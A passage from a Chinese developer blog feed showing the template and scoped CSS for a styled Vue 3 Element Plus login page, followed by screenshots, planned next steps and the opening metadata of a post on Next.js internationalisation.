  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-container"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-bg-animation"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bubble bubble-1"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bubble bubble-2"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"bubble bubble-3"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-card"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-header"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo-container"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-element-plus</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"logo-icon"</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-title"</span>&gt;</span>欢迎回来<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-subtitle"</span>&gt;</span>请登录您的账户以继续<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

      <span class="hljs-tag">&lt;<span class="hljs-name">el-form</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"loginFormRef"</span> <span class="hljs-attr">:model</span>=<span class="hljs-string">"loginForm"</span> <span class="hljs-attr">:rules</span>=<span class="hljs-string">"loginRules"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-form"</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"large"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">el-form-item</span> <span class="hljs-attr">prop</span>=<span class="hljs-string">"username"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"loginForm.username"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"用户名 / 邮箱"</span> <span class="hljs-attr">:prefix-icon</span>=<span class="hljs-string">"undefined"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">prefix</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-user</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"input-icon"</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-input</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">el-form-item</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">el-form-item</span> <span class="hljs-attr">prop</span>=<span class="hljs-string">"password"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-input</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"loginForm.password"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"密码"</span> <span class="hljs-attr">show-password</span> @<span class="hljs-attr">keyup.enter</span>=<span class="hljs-string">"handleLogin"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">template</span> #<span class="hljs-attr">prefix</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-lock</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"input-icon"</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-input</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">el-form-item</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-options"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-checkbox</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"loginForm.rememberMe"</span>&gt;</span>记住我<span class="hljs-tag">&lt;/<span class="hljs-name">el-checkbox</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-link</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">:underline</span>=<span class="hljs-string">"false"</span>&gt;</span>忘记密码？<span class="hljs-tag">&lt;/<span class="hljs-name">el-link</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">el-form-item</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">:loading</span>=<span class="hljs-string">"loading"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"primary"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-button"</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleLogin"</span> <span class="hljs-attr">round</span>&gt;</span>
            {{ loading ? '登录中...' : '登 录' }}
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">el-form-item</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">el-form</span>&gt;</span>

      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"login-footer"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"divider"</span>&gt;</span>或者<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"social-login"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">circle</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"small"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-chat-dot-round</span> /&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">circle</span> <span class="hljs-attr">size</span>=<span class="hljs-string">"small"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">i-ep-share</span> /&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-comment">/* 容器与背景 */</span>
<span class="hljs-selector-class">.login-container</span> {
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">135deg</span>, <span class="hljs-number">#1a1f38</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#252a4a</span> <span class="hljs-number">100%</span>);
  <span class="hljs-attribute">overflow</span>: hidden;
  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Inter'</span>, -apple-system, BlinkMacSystemFont, <span class="hljs-string">'Segoe UI'</span>, Roboto, sans-serif;
}

<span class="hljs-comment">/* 动态背景气泡 */</span>
<span class="hljs-selector-class">.login-bg-animation</span> {
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">top</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">0</span>;
  <span class="hljs-attribute">pointer-events</span>: none;
}

<span class="hljs-selector-class">.bubble</span> {
  <span class="hljs-attribute">position</span>: absolute;
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;
  <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">60px</span>);
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.6</span>;
  <span class="hljs-attribute">animation</span>: float <span class="hljs-number">10s</span> infinite ease-in-out;
}

<span class="hljs-selector-class">.bubble-1</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">400px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">400px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#409eff</span>;
  <span class="hljs-attribute">top</span>: -<span class="hljs-number">100px</span>;
  <span class="hljs-attribute">left</span>: -<span class="hljs-number">100px</span>;
  <span class="hljs-attribute">animation-delay</span>: <span class="hljs-number">0s</span>;
}

<span class="hljs-selector-class">.bubble-2</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">300px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#8e44ad</span>;
  <span class="hljs-attribute">bottom</span>: -<span class="hljs-number">50px</span>;
  <span class="hljs-attribute">right</span>: -<span class="hljs-number">50px</span>;
  <span class="hljs-attribute">animation-delay</span>: -<span class="hljs-number">2s</span>;
}

<span class="hljs-selector-class">.bubble-3</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">200px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-number">#2ecc71</span>;
  <span class="hljs-attribute">bottom</span>: <span class="hljs-number">20%</span>;
  <span class="hljs-attribute">left</span>: <span class="hljs-number">30%</span>;
  <span class="hljs-attribute">opacity</span>: <span class="hljs-number">0.4</span>;
  <span class="hljs-attribute">animation-delay</span>: -<span class="hljs-number">5s</span>;
}

<span class="hljs-keyword">@keyframes</span> float {
  <span class="hljs-number">0%</span>,
  <span class="hljs-number">100%</span> {
    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);
  }
  <span class="hljs-number">50%</span> {
    <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translate</span>(<span class="hljs-number">20px</span>, <span class="hljs-number">40px</span>);
  }
}

<span class="hljs-comment">/* 登录卡片 (Glassmorphism) */</span>
<span class="hljs-selector-class">.login-card</span> {
  <span class="hljs-attribute">position</span>: relative;
  <span class="hljs-attribute">z-index</span>: <span class="hljs-number">10</span>;
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">max-width</span>: <span class="hljs-number">420px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">40px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.05</span>);
  backdrop-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">20px</span>);
  -webkit-backdrop-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">blur</span>(<span class="hljs-number">20px</span>);
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.1</span>);
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">25px</span> <span class="hljs-number">50px</span> -<span class="hljs-number">12px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.5</span>);
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">flex-direction</span>: column;
  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span> ease;
}

<span class="hljs-selector-class">.login-card</span><span class="hljs-selector-pseudo">:hover</span> {
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">5px</span>);
  <span class="hljs-attribute">border-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.2</span>);
}

<span class="hljs-comment">/* 头部 */</span>
<span class="hljs-selector-class">.login-header</span> {
  <span class="hljs-attribute">text-align</span>: center;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">30px</span>;
}

<span class="hljs-selector-class">.logo-container</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">56px</span>;
  <span class="hljs-attribute">height</span>: <span class="hljs-number">56px</span>;
  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">135deg</span>, <span class="hljs-number">#409eff</span>, <span class="hljs-number">#337ecc</span>);
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">12px</span>;
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">8px</span> <span class="hljs-number">16px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">64</span>, <span class="hljs-number">158</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.3</span>);
}

<span class="hljs-selector-class">.logo-icon</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">32px</span>;
  <span class="hljs-attribute">color</span>: white;
}

<span class="hljs-selector-class">.login-title</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">28px</span>;
  <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">700</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">8px</span>;
  <span class="hljs-attribute">letter-spacing</span>: <span class="hljs-number">0.5px</span>;
}

<span class="hljs-selector-class">.login-subtitle</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">14px</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.6</span>);
}

<span class="hljs-comment">/* 表单样式调整 */</span>
:<span class="hljs-built_in">deep</span>(.el-input__wrapper) {
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>);
  <span class="hljs-attribute">box-shadow</span>: none <span class="hljs-meta">!important</span>;
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.1</span>);
  <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span> <span class="hljs-number">12px</span>;
  <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span>;
}

:<span class="hljs-built_in">deep</span>(.el-input__inner) {
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">caret-color</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">height</span>: auto;
}

:<span class="hljs-built_in">deep</span>(.el-input__wrapper:hover),
:<span class="hljs-built_in">deep</span>(.el-input__wrapper.is-focus) {
  <span class="hljs-attribute">border-color</span>: <span class="hljs-number">#409eff</span>;
  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.3</span>);
}

<span class="hljs-comment">/* 修复浏览器自动填充背景变白问题 */</span>
:<span class="hljs-built_in">deep</span>(.el-input__inner:-webkit-autofill),
:<span class="hljs-built_in">deep</span>(.el-input__inner:-webkit-autofill:hover),
:<span class="hljs-built_in">deep</span>(.el-input__inner:-webkit-autofill:focus),
:<span class="hljs-built_in">deep</span>(.el-input__inner:-webkit-autofill:active) {
  -webkit-text-fill-<span class="hljs-attribute">color</span>: <span class="hljs-number">#ffffff</span> <span class="hljs-meta">!important</span>;
  <span class="hljs-attribute">transition</span>: background-color <span class="hljs-number">99999s</span> ease-in-out <span class="hljs-number">0s</span>;
  <span class="hljs-attribute">background-color</span>: transparent <span class="hljs-meta">!important</span>;
}

<span class="hljs-selector-class">.input-icon</span> {
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">18px</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.5</span>);
}

<span class="hljs-selector-class">.form-options</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: space-between;
  <span class="hljs-attribute">align-items</span>: center;
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">24px</span>;
}

:<span class="hljs-built_in">deep</span>(.el-checkbox) {
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.7</span>);
}

:<span class="hljs-built_in">deep</span>(.el-checkbox__input.is-checked + .el-checkbox__label) {
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#409eff</span>;
}

<span class="hljs-selector-class">.login-button</span> {
  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
  <span class="hljs-attribute">padding</span>: <span class="hljs-number">22px</span> <span class="hljs-number">0</span>;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;
  <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">600</span>;
  <span class="hljs-attribute">letter-spacing</span>: <span class="hljs-number">1px</span>;
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">90deg</span>, <span class="hljs-number">#409eff</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#0077ff</span> <span class="hljs-number">100%</span>);
  <span class="hljs-attribute">border</span>: none;
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">14px</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">64</span>, <span class="hljs-number">158</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.39</span>);
  <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span>;
}

<span class="hljs-selector-class">.login-button</span><span class="hljs-selector-pseudo">:hover</span> {
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">scale</span>(<span class="hljs-number">1.02</span>);
  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">6px</span> <span class="hljs-number">20px</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">64</span>, <span class="hljs-number">158</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.5</span>);
}

<span class="hljs-comment">/* 底部 */</span>
<span class="hljs-selector-class">.login-footer</span> {
  <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;
  <span class="hljs-attribute">text-align</span>: center;
}

<span class="hljs-selector-class">.divider</span> {
  <span class="hljs-attribute">display</span>: block;
  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">12px</span>;
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.3</span>);
  <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">15px</span>;
}

<span class="hljs-selector-class">.social-login</span> {
  <span class="hljs-attribute">display</span>: flex;
  <span class="hljs-attribute">justify-content</span>: center;
  <span class="hljs-attribute">gap</span>: <span class="hljs-number">15px</span>;
}

:<span class="hljs-built_in">deep</span>(.social-login .el-button) {
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.1</span>);
  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.1</span>);
  <span class="hljs-attribute">color</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.7</span>);
  <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span>;
}

:<span class="hljs-built_in">deep</span>(.social-login .el-button:hover) {
  <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">0.2</span>);
  <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">2px</span>);
}

<span class="hljs-comment">/* 移动端适配 */</span>
<span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">480px</span>) {
  <span class="hljs-selector-class">.login-card</span> {
    <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span>;
    <span class="hljs-attribute">padding</span>: <span class="hljs-number">30px</span> <span class="hljs-number">20px</span>;
  }
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p>简单模拟下登录逻辑，需要在 mock 中创建模拟接口，然后在 <code>src/api</code> 下封装请求函数，最后到相关组件中进行调用</p>
<h3 data-id="heading-16">效果</h3>
<p>登录页：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c96f4f350c4f4794aacd3ebe1814b46a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5oyW5Zyf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766461042&amp;x-signature=dlmf09dsScI9Eth74gBdK4L90QY%3D" alt="login.png" loading="lazy"/></p>
<p>布局首页：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9c34032d74ec48fba9e1739f37f80586~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5oyW5Zyf:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766461042&amp;x-signature=ePvMbWDlUvGS6S1XEDYKPYytkj8%3D" alt="layout.png" loading="lazy"/></p>
<p>感觉比我写得好。。不想丸辣</p>
<h3 data-id="heading-17">后续</h3>
<p>如果还有后续的话。。</p>
<ul>
<li>使用 Nest.js 搭建一个权限系统后端</li>
<li>左侧路由菜单根据权限系统返回内容动态生成</li>
<li>完善页面基础内容</li>
<li>团队协作：代码风格统一与 git 提交规范</li>
</ul>
<p>源码会提交到这个地址 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FsingleGou%2Felementplus-js-admin" target="_blank" title="https://github.com/singleGou/elementplus-js-admin" ref="nofollow noopener noreferrer">elementplus-js-admin</a>，欢迎 spa</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Next.js 国际化实现方案详解]]></title>    <link>https://juejin.cn/post/7583971282892685364</link>    <guid>https://juejin.cn/post/7583971282892685364</guid>    <pubDate>2025-12-16T04:00:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583971282892685364" data-draft-id="7583973472323371023" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Next.js 国际化实现方案详解"/> <meta itemprop="keywords" content="前端,Next.js"/> <meta itemprop="datePublished" content="2025-12-16T04:00:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="少卿"/> <meta itemprop="url" content="https://juejin.cn/user/26044010879709"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Next.js 国际化实现方案详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/26044010879709/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    少卿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T04:00:42.000Z" title="Tue Dec 16 2025 04:00:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
